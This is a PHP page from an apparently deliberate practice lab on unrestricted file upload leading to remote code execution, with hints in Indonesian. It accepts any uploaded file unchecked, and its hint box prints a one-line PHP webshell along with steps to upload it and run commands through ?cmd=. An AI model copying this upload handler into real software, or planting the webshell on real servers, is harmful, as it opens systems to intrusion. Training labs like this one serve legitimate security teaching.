<?php
$title = 'Lab 1: Unrestricted Upload (RCE)';
$error = ''; $uploaded_name = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    // VULNERABLE: tidak ada validasi ekstensi, tipe konten, maupun isi file sama sekali.
    $name = basename($_FILES['file']['name']);
    $dest = __DIR__ . '/uploads/' . $name;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        $uploaded_name = $name;
    } else {
        $error = 'Upload failed.';
    }
}

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: tidak ada validasi sama sekali. Upload file PHP berisi webshell, lalu
akses langsung file yang ter-upload untuk eksekusi kode:</p>
<pre class="hint">&lt;?php system($_GET['cmd']); ?&gt;</pre>
<p class="hint">Simpan sebagai <code>shell.php</code>, upload lewat form di bawah, lalu buka
<code>uploads/shell.php?cmd=id</code>.</p>
</details>

<?php if ($error): ?><div class="error-box"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>
<?php if ($uploaded_name): ?>
<div class="success-box">Uploaded to uploads/<?php echo htmlspecialchars($uploaded_name); ?>
&mdash; <a href="uploads/<?php echo rawurlencode($uploaded_name); ?>?cmd=id" target="_blank">buka &amp; coba ?cmd=id</a></div>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
  <label>File</label><br>
  <input type="file" name="file"><br>
  <button type="submit">Upload</button>
</form>

<?php
$files = array_diff(scandir(__DIR__ . '/uploads'), ['.', '..', '.gitkeep']);
if ($files): ?>
<h3>Uploaded files</h3>
<ul class="file-list">
<?php foreach ($files as $f): ?>
  <li><a href="uploads/<?php echo rawurlencode($f); ?>" target="_blank"><?php echo htmlspecialchars($f); ?></a></li>
<?php endforeach; ?>
</ul>
<?php endif; ?>

<?php include 'footer.php'; ?>
